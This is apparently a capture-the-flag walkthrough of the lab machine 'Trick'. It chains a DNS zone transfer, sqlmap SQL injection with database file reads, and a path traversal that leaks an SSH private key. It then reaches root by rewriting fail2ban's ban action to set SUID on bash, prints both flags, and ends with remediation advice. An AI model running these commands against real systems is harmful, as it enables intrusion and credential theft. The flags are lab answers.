
| Property         | Value                                                                                                                            |
| ---------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **OS**           | Linux                                                                                                                            |
| **Difficulty**   | Easy                                                                                                                             |
| **Release Date** | 2026-09-15                                                                                                                       |
| **State**        | Active                                                                                                                           |
| **IP**           | 10.129.227.180                                                                                                                   |
| **Techniques**   | DNS zone transfer, SQL injection, `FILE` privilege abuse, path traversal, sudo misconfiguration, fail2ban action-file SUID abuse |
| **Tags**         | #web #privesc #linux #dns #sqli                                                                                                  |

> **Note:** The machine's IP address changes across sections of this writeup due to restarts (`10.129.227.180`, `10.129.137.188`).

---

## Summary

Trick is an easy Linux machine hosting a web page on port 80, alongside SSH, SMTP, and a DNS server. An unrestricted **AXFR zone transfer** against the domain's own nameserver discloses a hidden virtual host, `preprod-payroll.trick.htb`. This site is vulnerable to a SQL injection in its login form, which is used with `sqlmap` to dump the backend database. Although the recovered application credentials are a dead end, the database user turns out to hold the MySQL `FILE` privilege, which is abused to read arbitrary files off the server, including the Nginx site configuration. That configuration discloses a second virtual host, `preprod-marketing.trick.htb`, whose `page` parameter is vulnerable to **path traversal**, allowing file read disclosing the user `michael`'s SSH private key. Privilege escalation abuses a `sudo` rule that lets `michael` restart the `fail2ban` service, combined with group-membership write access to fail2ban's `action.d` directory: the `iptables-multiport.conf` action file is edited so that its "ban" action sets the SUID bit on `/bin/bash` instead of blocking traffic, and triggering a fail2ban ban (via a simulated SSH brute-force) executes that action as root, granting a root shell.

---

## Enumeration

### Nmap Scan

```
nmap -sC -sV trick.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-15 17:04 EDT
Nmap scan report for trick.htb (10.129.227.180)
Host is up (0.029s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 247.77 seconds
```

The scan discloses SSH (22), an SMTP listener that refuses a banner grab (25), a BIND DNS server (53), and an Nginx web server (80) serving a static "coming soon" placeholder page. 

### DNS Zone Transfer

An **AXFR (Asynchronous Full Transfer of Zone)** request is a legitimate DNS mechanism intended for secondary nameservers to replicate an entire zone from the primary. When a nameserver fails to restrict which hosts may request one, any client can pull a full listing of every record in the zone — a common and severe misconfiguration.

```
dig AXFR @trick.htb trick.htb

; <<>> DiG 9.20.15-2-Debian <<>> AXFR @trick.htb trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 48 msec
;; SERVER: 10.129.227.180#53(trick.htb) (TCP)
;; WHEN: Wed Sep 16 07:59:42 EDT 2026
;; XFR size: 6 records (messages 1, bytes 313)
```

The unrestricted transfer discloses a subdomain that was never linked from the main site: `preprod-payroll.trick.htb`. This is added to `/etc/hosts` for further enumeration:

```
echo '10.129.227.180 preprod-payroll.trick.htb' | sudo tee -a /etc/hosts
```

Browsing to it reveals a **Payroll** management login portal:

![](Trick/screens/1.png)

---

## Foothold — SQL Injection

### Capturing the Login Request

The login form posts to `ajax.php`. The request is captured in Burp Suite and saved for use with `sqlmap`:

```http
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 27
Origin: http://preprod-payroll.trick.htb
Referer: http://preprod-payroll.trick.htb/login.php
Cookie: PHPSESSID=pnaaf157pig45llsg0ft7hdrip

username=test&password=test
```

### Confirming the Injection

```
sqlmap -r req.txt --batch
```

```
[08:41:33] [INFO] testing for SQL injection on POST parameter 'username'
[08:41:46] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[08:41:52] [INFO] target URL appears to be UNION injectable with 8 columns

sqlmap identified the following injection point(s):
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3523 FROM (SELECT(SLEEP(5)))EHpf) AND 'iEAW'='iEAW&password=test
---
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

The `username` field is not sanitized before being placed into the login query, allowing a boolean/time-based blind injection. A UNION-based path is also flagged as usable, but the more reliable time-based technique is what `sqlmap` settles on.

### Database Enumeration

Enumerating available databases and tables:

```
sqlmap -r req.txt --batch --dump
```

```
[*] payroll_db
[08:44:15] [INFO] fetching tables for database: 'payroll_db'
position, employee, department, payroll_items, attendance,
employee_deductions, employee_allowances, users, deductions, payroll, allowances
```

Dumping the `users` table:

```
sqlmap -r req.txt --dump -T users -D payroll_db
```

```
Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type   | address | contact | password              | username   |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1      | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
```

The recovered pair (`Enemigosss:SuperGucciRainbowCake`) does not correspond to any usable OS-level or service account — it turns out to be a dead end for direct login, but the SQL injection itself is not finished yielding value yet.

### Escalating the Injection — `FILE` Privilege

Rather than stop at data exfiltration, `sqlmap` is used to check what privileges the connecting database user holds:

```
sqlmap -r req.txt --privilege
```

```
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE
```

The database account `remo` holds the MySQL **`FILE`** privilege. In MySQL/MariaDB, a user with this privilege can call `LOAD_FILE()` to read arbitrary files the database process has permission to open, and `sqlmap`'s `--file-read` option wraps this primitive automatically through the existing injection point.

### Reading the Nginx Configuration

```
sqlmap -r req.txt --file-read="/etc/nginx/nginx.conf" --batch
```

The retrieved `sites-enabled/default` file (saved locally by `sqlmap` under its output directory) reveals a **second, undisclosed virtual host** that also was not found through the zone transfer:

```nginx
server {
    listen 80;
    listen [::]:80;
    server_name preprod-marketing.trick.htb;
    root /var/www/market;
    index index.php;
    location / {
        try_files $uri $uri/ =404;
    }
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
    }
}
server {
    listen 80;
    listen [::]:80;
    server_name preprod-payroll.trick.htb;
    root /var/www/payroll;
    index index.php;
    location / {
        try_files $uri $uri/ =404;
    }
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php7.3-fpm.sock;
    }
}
```

Two details stand out: the newly-disclosed `preprod-marketing.trick.htb` vhost, and the fact that its PHP-FPM pool socket is named `php7.3-fpm-michael.sock` — a strong hint that this site's PHP worker runs specifically as the user `michael`.

```
echo '10.129.227.180 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
```

---

## Local File Inclusion / Path Traversal

Browsing `preprod-marketing.trick.htb` reveals a marketing site that loads its content dynamically through a `page` GET parameter (e.g. `index.php?page=about`), a classic pattern for a local file inclusion vulnerability if the parameter is not validated against a fixed allow-list.

### Reading `/etc/passwd`

Directory traversal sequences are doubled up (`....//`) to survive any naive single-pass `../` stripping filter:

```
curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
...
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

This confirms arbitrary file read and surfaces `michael` as the only non-system account on the box — consistent with the `php-fpm-michael.sock` naming seen in the Nginx config.

### Reading `michael`'s SSH Private Key

Since the LFI grants read access to any file the web server (and, by the PHP-FPM pool binding, effectively `michael`) can open, `michael`'s own SSH key is a natural next target:

```
curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa"
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

The key is saved locally as `michael.key`, permissions are tightened, and it is used for SSH login.

### SSH Access

```
chmod 600 michael.key
ssh michael@trick.htb -i michael.key
```

```
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
Last login: Thu Sep 17 23:49:48 2026 from 10.10.15.80
michael@trick:~$
```

---

## User Flag

```
michael@trick:~$ cat user.txt
7336889372d8413cf2a12535b02e2a90
```

---

## Privilege Escalation

### Enumeration

```
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

```
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

`michael` can restart the `fail2ban` service as root with no password. On its own this is a limited primitive (fail2ban re-reads its configuration on restart, but restarting it doesn't directly execute arbitrary commands) — the real value comes from what else `michael` can influence.

`michael` also belongs to a non-default group, `security`. Searching for files owned by that group:

```
michael@trick:~$ find / -group security 2>/dev/null
/etc/fail2ban/action.d
```

```
michael@trick:~$ ls -la /etc/fail2ban/action.d
drwxrwx--- 2 root security  4096 Sep 18 14:42 .
-rw-r--r-- 1 root root      1339 Sep 18 14:42 iptables.conf
-rw-r--r-- 1 root root      1420 Sep 18 14:42 iptables-multiport.conf
...
```

The `security` group has **read/write** access to `/etc/fail2ban/action.d`, the directory holding fail2ban's "action" definitions — the shell commands fail2ban executes whenever a jail bans or unbans an IP address. `fail2ban.conf`'s default jail (`sshd`) uses the `iptables-multiport` action, and combining that with the `sudo` rule above completes the chain: `michael` can rewrite what fail2ban does when it bans an IP, then force fail2ban to reload that logic as root.

### Exploitation

The action file is copied out for editing:

```
michael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf .
```

The `actionban` directive — normally an `iptables` rule that blocks the offending IP — is replaced with a command that sets the SUID bit on `/bin/bash`:

```ini
actionban = chmod u+s /bin/bash
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
```

The modified file is moved back into place, overwriting the original (writable thanks to `security` group membership):

```
michael@trick:~$ mv iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
mv: replace '/etc/fail2ban/action.d/iptables-multiport.conf', overriding mode 0644 (rw-r--r--)? y
```

fail2ban is restarted as root via the allowed `sudo` command so it picks up the tampered action file:

```
michael@trick:~$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

To actually trigger the "ban" event (and therefore the malicious `actionban` command), the `sshd` jail needs to see enough failed login attempts from a single source to cross its threshold. A brute-force flood against SSH is used purely to generate that volume of failures — the credentials themselves are irrelevant:

```
hydra 10.129.137.188 ssh -l root -P /usr/share/wordlists/rockyou.txt
```

Once fail2ban's `sshd` jail bans the attacking IP, it invokes `iptables-multiport`'s `actionban`, which now runs `chmod u+s /bin/bash` **as root** (fail2ban's own service runs with root privileges):

```
michael@trick:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

The `s` in the permission bits confirms the SUID bit is now set on `/bin/bash`. Invoking bash with `-p` (preserve privileges) yields a root-owned effective UID:

```
michael@trick:~$ /bin/bash -p
bash-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
```

---

## Root Flag

```
bash-5.0# cat /root/root.txt
7bcc6d11dcc64672dd4d8e8c103c4591
```

---

## Remediation

- **Unrestricted DNS zone transfer (AXFR):** Restrict zone transfers to explicitly authorized secondary nameservers (`allow-transfer` in BIND) and never allow AXFR from arbitrary clients. Zone data should not be treated as a source of "hidden" subdomains.
- **SQL injection in the payroll login form:** Use parameterized queries / prepared statements for all database access. Never build SQL strings by concatenating unsanitized user input.
- **Excessive database privileges:** The application's MySQL account should never have been granted the `FILE` privilege. Scope database accounts to the minimum privileges required (`SELECT`/`INSERT`/`UPDATE` on specific application tables only) and disable `FILE`/`SUPER` for web-facing accounts.
- **Sensitive configuration disclosure:** Restrict filesystem permissions so that the MySQL service account cannot read files like `/etc/nginx/nginx.conf` or other configuration outside its own data directory.
- **Local file inclusion / path traversal in the marketing site:** Never resolve a user-supplied `page` parameter directly against the filesystem. Use a strict allow-list of valid page identifiers mapped internally to fixed file paths.
- **Private key readable via a web-facing PHP process:** `michael`'s SSH private key should never have been reachable by the web server user. Restrict `~/.ssh` permissions to `700`/`600` and ensure no other account or process (including PHP-FPM pools) can read it.
- **Overly permissive `sudo` rule:** Granting `NOPASSWD` control over service restarts is dangerous when the service's own configuration is writable by the same user (directly or via group membership). Ensure any user permitted to restart a privileged service cannot also modify what that service executes.
- **Group-writable fail2ban `action.d` directory:** Action definitions executed by fail2ban run with the privileges of the fail2ban service (root). This directory must be writable only by `root`; membership in a group with write access to it is equivalent to arbitrary root code execution the next time fail2ban reloads and triggers an action.

---

## References

- [ISC BIND — `allow-transfer` and Zone Transfer Security](https://bind9.readthedocs.io/en/latest/reference.html)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MySQL Documentation — `FILE` Privilege and `LOAD_FILE()`](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [fail2ban Documentation — Actions](https://fail2ban.readthedocs.io/en/latest/manpages/jail.conf.5.html)
- [sqlmap Documentation](https://sqlmap.org/)